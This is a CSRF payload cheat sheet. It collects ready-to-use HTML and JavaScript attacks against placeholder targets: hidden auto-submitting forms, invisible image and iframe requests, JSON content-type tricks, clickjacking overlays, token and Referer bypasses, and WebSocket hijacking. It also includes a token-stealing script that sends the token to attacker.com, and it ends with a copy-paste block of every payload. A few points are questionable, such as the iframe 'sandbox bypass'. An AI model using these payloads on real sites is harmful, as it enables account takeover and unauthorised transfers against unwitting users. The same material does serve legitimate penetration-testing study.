# CSRF PAYLOADS COMPLETE CHEAT SHEET

## 1. CSRF VIA GET (Image / Iframe / Script)

State-changing actions performed via GET requests are the easiest to exploit. The payload executes automatically when the victim loads the attacker-controlled page.

### Invisible Image
```
<img src="https://vulnerable-website.com/email/change?email=attacker@evil.com" width="0" height="0" border="0" style="display:none;">
```

### Hidden Iframe
```
<iframe src="https://vulnerable-website.com/transfer?amount=1000&to=attacker" style="display:none;"></iframe>
```

### Script Tag
```
<script src="https://vulnerable-website.com/transfer?amount=1000&to=attacker"></script>
```

### Link with Auto-Click (for GET actions requiring a click)
```
<a href="https://vulnerable-website.com/email/change?email=attacker@evil.com" id="csrf">Click me</a>
<script>document.getElementById('csrf').click();</script>
```

---

## 2. CSRF VIA POST (Auto-Submitting Form)

For endpoints that require POST. Use a hidden form and JavaScript to submit it automatically when the victim visits the attacker page.

### Basic Auto-Submit Form
```
<html>
  <body>
    <form action="https://vulnerable-website.com/email/change" method="POST" id="csrf-form">
      <input type="hidden" name="email" value="attacker@evil.com" />
    </form>
    <script>document.getElementById('csrf-form').submit();</script>
  </body>
</html>
```

### Minimal Auto-Submit Form (One-Liner)
```
<form method="POST" action="https://vulnerable-website.com/my-account/change-email"><input type="hidden" name="email" value="attacker@evil.com"></form><script>document.forms[0].submit();</script>
```

### Form with Multiple Fields
```
<html>
  <body>
    <form action="https://vulnerable-website.com/api/transfer" method="POST" id="csrf-form">
      <input type="hidden" name="amount" value="1000" />
      <input type="hidden" name="to" value="attacker" />
      <input type="hidden" name="currency" value="USD" />
    </form>
    <script>document.getElementById('csrf-form').submit();</script>
  </body>
</html>
```

### Form with Submit Button (Manual Fallback)
```
<html>
  <body>
    <form action="https://vulnerable-website.com/profile" method="POST">
      <input name="username" value="attacker" />
      <input type="submit" />
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```

---

## 3. CSRF VIA JSON (Content-Type Bypass)

If the API expects JSON but does not strictly validate the `Content-Type: application/json` header, you can simulate a JSON payload using a normal form with `enctype="text/plain"`.

### JSON CSRF with text/plain
```
<html>
  <body>
    <form action="https://vulnerable-website.com/api/transfer" method="POST" enctype="text/plain" id="json-csrf">
      <input type="hidden" name='{"amount": 1000, "to": "attacker", "padding": "' value='"}' />
    </form>
    <script>document.getElementById('json-csrf').submit();</script>
  </body>
</html>
```

Resulting body sent: `{"amount": 1000, "to": "attacker", "padding": "="}`

### JSON CSRF with fetch (if CORS is misconfigured)
```
<script>
fetch('https://vulnerable-website.com/api/transfer', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({amount: 1000, to: 'attacker'})
});
</script>
```

### JSON CSRF with XMLHttpRequest
```
<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', 'https://vulnerable-website.com/api/transfer', true);
xhr.withCredentials = true;
xhr.setRequestHeader('Content-Type', 'application/json');
xhr.send(JSON.stringify({amount: 1000, to: 'attacker'}));
</script>
```

---

## 4. CSRF VIA IFRAME (Clickjacking / UI Redressing)

Overlay an iframe on top of a decoy element to trick the user into clicking a hidden button.

### Basic Iframe Overlay
```
<style>
    iframe {
        position: relative;
        width: 700px;
        height: 500px;
        opacity: 0.5;
        z-index: 2;
    }
    div {
        position: absolute;
        top: 385px;
        left: 80px;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe src="https://vulnerable-website.com/my-account?email=attacker@evil.com"></iframe>
```

### Sandboxed Iframe (Bypass sandbox attribute)
```
<style>
    iframe {
        position: relative;
        width: 700px;
        height: 500px;
        opacity: 0.5;
        z-index: 2;
    }
    div {
        position: absolute;
        top: 385px;
        left: 80px;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe sandbox="allow-forms" src="https://vulnerable-website.com/my-account?email=attacker@evil.com"></iframe>
```

### Full-Page Iframe
```
<iframe src="https://vulnerable-website.com/my-account" style="position:fixed;top:0;left:0;width:100%;height:100%;border:none;z-index:9999;"></iframe>
```

---

## 5. CSRF BYPASS TECHNIQUES

### Method Change (POST to GET)
```
<form action="https://vulnerable-website.com/action" method="GET">
  <input type="hidden" name="param" value="value" />
</form>
<script>document.forms[0].submit();</script>
```

### Remove CSRF Token Field
Simply delete the hidden CSRF input from the form. Some servers only validate if the parameter is present.
```
<form action="https://vulnerable-website.com/action" method="POST" id="csrf-form">
  <input type="hidden" name="email" value="attacker@evil.com" />
  <!-- No csrf_token field -->
</form>
<script>document.getElementById('csrf-form').submit();</script>
```

### Empty CSRF Token
```
<form action="https://vulnerable-website.com/action" method="POST" id="csrf-form">
  <input type="hidden" name="email" value="attacker@evil.com" />
  <input type="hidden" name="csrf_token" value="" />
</form>
<script>document.getElementById('csrf-form').submit();</script>
```

### Referer Bypass (no-referrer)
```
<head>
  <meta name="referrer" content="no-referrer">
</head>
<form action="https://vulnerable-website.com/action" method="POST" id="csrf-form">
  <input type="hidden" name="email" value="attacker@evil.com" />
</form>
<script>document.getElementById('csrf-form').submit();</script>
```

### Referer Bypass (same-origin via subdomain)
If the server checks that the Referer contains the target domain, host the payload on a subdomain of the target.
```
https://attacker.vulnerable-website.com/csrf.html
```

### Token in URL Instead of Body
```
<form action="https://vulnerable-website.com/action?csrf_token=INVALID" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com" />
</form>
<script>document.forms[0].submit();</script>
```

### Double Submit Cookie Bypass
If the app uses double-submit cookies, set the cookie and the parameter to the same value from the attacker page.
```
<script>
document.cookie = "csrf_token=attacker_value; path=/";
</script>
<form action="https://vulnerable-website.com/action" method="POST">
  <input type="hidden" name="csrf_token" value="attacker_value" />
  <input type="hidden" name="email" value="attacker@evil.com" />
</form>
<script>document.forms[0].submit();</script>
```

### SameSite=Lax Bypass (top-level navigation)
Lax cookies are sent on top-level GET navigations. If the action accepts GET, this works.
```
<a href="https://vulnerable-website.com/email/change?email=attacker@evil.com">Click me</a>
```

### Flash-Based Bypass (legacy)
```
<object type="application/x-shockwave-flash" data="csrf.swf" width="0" height="0">
  <param name="movie" value="csrf.swf" />
  <param name="FlashVars" value="url=https://vulnerable-website.com/action" />
</object>
```

---

## 6. CSRF VIA WEBSOCKET (Hijacking)

If the app uses WebSockets without CSRF protection, you can open a WebSocket connection from the attacker page. Cookies are sent automatically.
```
<script>
var ws = new WebSocket('wss://vulnerable-website.com/ws');
ws.onopen = function() {
  ws.send(JSON.stringify({action: 'transfer', amount: 1000, to: 'attacker'}));
};
</script>
```

---

## 7. CSRF VIA CORS MISCONFIGURATION

If the server reflects the `Origin` header or allows `null` origin, you can read responses and perform actions.
```
<script>
fetch('https://vulnerable-website.com/api/user', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({email: 'attacker@evil.com'})
}).then(r => r.text()).then(d => console.log(d));
</script>
```

---

## 8. CSRF TOKEN LEAKAGE VECTORS

### Token in HTML (scraping via iframe)
```
<iframe src="https://vulnerable-website.com/form" id="f"></iframe>
<script>
document.getElementById('f').onload = function() {
  var token = this.contentDocument.querySelector('input[name="csrf_token"]').value;
  fetch('https://attacker.com/log?token=' + token);
};
</script>
```

### Token in URL (Referer leakage)
```
<img src="https://vulnerable-website.com/page?csrf_token=LEAKED" />
```

---

## 9. QUICK REFERENCE – CSRF PAYLOAD STRUCTURE

| Method | Context | Template |
|--------|---------|----------|
| GET | Image / Iframe | `<img src="URL?param=value">` |
| POST | Auto-submit form | `<form method="POST" action="URL">...</form><script>document.forms[0].submit();</script>` |
| JSON | text/plain form | `<form enctype="text/plain" ...>` |
| JSON | fetch / XHR | `fetch(URL, {method:'POST', credentials:'include', body:...})` |
| Iframe | Clickjacking | `<iframe src="URL" style="opacity:0.5;">` |
| WebSocket | Hijacking | `new WebSocket('wss://URL')` |

---

## 10. TIPS FOR TESTING CSRF

1. Check if the target action uses GET or POST. GET is easier to exploit.
2. Look for missing or predictable CSRF tokens.
3. Test if removing the CSRF token field still works.
4. Test if the token is validated only on POST but not on GET.
5. Try changing the `Content-Type` to `text/plain` for JSON endpoints.
6. Check if the `Referer` header is validated. If not, use `<meta name="referrer" content="no-referrer">`.
7. Test if `SameSite` cookies are set. If `Lax`, GET-based CSRF may still work on top-level navigation.
8. For iframe-based attacks, check if `X-Frame-Options` or `Content-Security-Policy: frame-ancestors` is set.
9. If the app uses double-submit cookies, try setting the cookie from the attacker page.
10. Always test on your own account first to confirm the action succeeds.

---

## ALL IN ONE JUST FOR COPY PASTE AND USE IN A TXT FILE

```
<img src="https://vulnerable-website.com/email/change?email=attacker@evil.com" width="0" height="0" border="0" style="display:none;">
<iframe src="https://vulnerable-website.com/transfer?amount=1000&to=attacker" style="display:none;"></iframe>
<script src="https://vulnerable-website.com/transfer?amount=1000&to=attacker"></script>
<a href="https://vulnerable-website.com/email/change?email=attacker@evil.com" id="csrf">Click me</a>
<script>document.getElementById('csrf').click();</script>
<html><body><form action="https://vulnerable-website.com/email/change" method="POST" id="csrf-form"><input type="hidden" name="email" value="attacker@evil.com" /></form><script>document.getElementById('csrf-form').submit();</script></body></html>
<form method="POST" action="https://vulnerable-website.com/my-account/change-email"><input type="hidden" name="email" value="attacker@evil.com"></form><script>document.forms[0].submit();</script>
<html><body><form action="https://vulnerable-website.com/api/transfer" method="POST" id="csrf-form"><input type="hidden" name="amount" value="1000" /><input type="hidden" name="to" value="attacker" /><input type="hidden" name="currency" value="USD" /></form><script>document.getElementById('csrf-form').submit();</script></body></html>
<html><body><form action="https://vulnerable-website.com/profile" method="POST"><input name="username" value="attacker" /><input type="submit" /></form><script>document.forms[0].submit();</script></body></html>
<html><body><form action="https://vulnerable-website.com/api/transfer" method="POST" enctype="text/plain" id="json-csrf"><input type="hidden" name='{"amount": 1000, "to": "attacker", "padding": "' value='"}' /></form><script>document.getElementById('json-csrf').submit();</script></body></html>
<script>fetch('https://vulnerable-website.com/api/transfer', {method: 'POST', credentials: 'include', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({amount: 1000, to: 'attacker'})});</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('POST', 'https://vulnerable-website.com/api/transfer', true); xhr.withCredentials = true; xhr.setRequestHeader('Content-Type', 'application/json'); xhr.send(JSON.stringify({amount: 1000, to: 'attacker'}));</script>
<style>iframe {position: relative; width: 700px; height: 500px; opacity: 0.5; z-index: 2;} div {position: absolute; top: 385px; left: 80px; z-index: 1;}</style><div>Test me</div><iframe src="https://vulnerable-website.com/my-account?email=attacker@evil.com"></iframe>
<style>iframe {position: relative; width: 700px; height: 500px; opacity: 0.5; z-index: 2;} div {position: absolute; top: 385px; left: 80px; z-index: 1;}</style><div>Test me</div><iframe sandbox="allow-forms" src="https://vulnerable-website.com/my-account?email=attacker@evil.com"></iframe>
<iframe src="https://vulnerable-website.com/my-account" style="position:fixed;top:0;left:0;width:100%;height:100%;border:none;z-index:9999;"></iframe>
<form action="https://vulnerable-website.com/action" method="GET"><input type="hidden" name="param" value="value" /></form><script>document.forms[0].submit();</script>
<form action="https://vulnerable-website.com/action" method="POST" id="csrf-form"><input type="hidden" name="email" value="attacker@evil.com" /></form><script>document.getElementById('csrf-form').submit();</script>
<form action="https://vulnerable-website.com/action" method="POST" id="csrf-form"><input type="hidden" name="email" value="attacker@evil.com" /><input type="hidden" name="csrf_token" value="" /></form><script>document.getElementById('csrf-form').submit();</script>
<head><meta name="referrer" content="no-referrer"></head><form action="https://vulnerable-website.com/action" method="POST" id="csrf-form"><input type="hidden" name="email" value="attacker@evil.com" /></form><script>document.getElementById('csrf-form').submit();</script>
<form action="https://vulnerable-website.com/action?csrf_token=INVALID" method="POST"><input type="hidden" name="email" value="attacker@evil.com" /></form><script>document.forms[0].submit();</script>
<script>document.cookie = "csrf_token=attacker_value; path=/";</script><form action="https://vulnerable-website.com/action" method="POST"><input type="hidden" name="csrf_token" value="attacker_value" /><input type="hidden" name="email" value="attacker@evil.com" /></form><script>document.forms[0].submit();</script>
<a href="https://vulnerable-website.com/email/change?email=attacker@evil.com">Click me</a>
<object type="application/x-shockwave-flash" data="csrf.swf" width="0" height="0"><param name="movie" value="csrf.swf" /><param name="FlashVars" value="url=https://vulnerable-website.com/action" /></object>
<script>var ws = new WebSocket('wss://vulnerable-website.com/ws'); ws.onopen = function() { ws.send(JSON.stringify({action: 'transfer', amount: 1000, to: 'attacker'})); };</script>
<script>fetch('https://vulnerable-website.com/api/user', {method: 'POST', credentials: 'include', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({email: 'attacker@evil.com'})}).then(r => r.text()).then(d => console.log(d));</script>
<iframe src="https://vulnerable-website.com/form" id="f"></iframe><script>document.getElementById('f').onload = function() { var token = this.contentDocument.querySelector('input[name="csrf_token"]').value; fetch('https://attacker.com/log?token=' + token); };</script>
<img src="https://vulnerable-website.com/page?csrf_token=LEAKED" />
```
